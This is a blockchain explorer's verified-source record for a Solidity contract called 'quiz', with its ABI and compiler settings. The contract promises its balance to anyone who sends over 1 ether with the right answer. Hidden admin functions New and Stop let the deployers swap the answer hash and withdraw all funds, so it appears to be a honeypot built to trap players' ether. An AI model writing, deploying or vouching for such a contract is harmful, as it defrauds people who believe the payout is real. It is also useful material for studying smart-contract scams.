{"status": "1", "message": "OK", "result": [{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/quiz.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\r\\npragma solidity >=0.4.22 <0.9.0;\\r\\n\\r\\ncontract quiz\\r\\n{\\r\\n    function Try(string memory _response) public payable\\r\\n    {\\r\\n        if(answerHash == keccak256(abi.encode(_response)) && msg.value > 1 ether)\\r\\n        {\\r\\n            payable(msg.sender).transfer(address(this).balance);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    string public question;\\r\\n\\r\\n    bytes32 answerHash;\\r\\n\\r\\n    mapping (bytes32=>bool) admin;\\r\\n\\r\\n\\r\\n    function Start(string calldata _question, string calldata _response) public payable isAdmin{\\r\\n        if(answerHash == 0x0)\\r\\n        {\\r\\n            answerHash = keccak256(abi.encode(_response));\\r\\n            question = _question;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function Stop(address to) public payable isAdmin {\\r\\n        payable(to).transfer(address(this).balance);\\r\\n    }\\r\\n\\r\\n    function New(string calldata _question, bytes32 _answerHash) public payable isAdmin {\\r\\n        question = _question;\\r\\n        answerHash = _answerHash;\\r\\n    }\\r\\n\\r\\n    constructor(bytes32[] memory admins) {\\r\\n        for(uint256 i=0; i< admins.length; i++){\\r\\n            admin[admins[i]] = true;\\r\\n        }\\r\\n    }\\r\\n\\r\\n\\r\\n    function viewQuestion204() public view returns(string memory) \\r\\n    {\\r\\n        return question;\\r\\n    }\\r\\n\\r\\n    modifier isAdmin(){\\r\\n        require(admin[keccak256(abi.encodePacked(msg.sender))]);\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    fallback() external {}\\r\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"bytes32[]\",\"name\":\"admins\",\"type\":\"bytes32[]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_question\",\"type\":\"string\"},{\"internalType\":\"bytes32\",\"name\":\"_answerHash\",\"type\":\"bytes32\"}],\"name\":\"New\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_question\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Try\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"question\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"viewQuestion204\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "quiz", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004b47e7ee8ca021c1d608383e721fe176e7a685d65642f97349f348fd5d14d518ce318bbdb968dfe7232e97947c08e5018ee7c6e17641d7331dcd0c259b563363d8c45bde1ceb48a61850c4189621124a78ea451f2daff73085bd920f4ca6a40e9ad3efd149afcea53978a02fe5c490dc726a8a4b7847f2496ce75d438c8799444", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}]}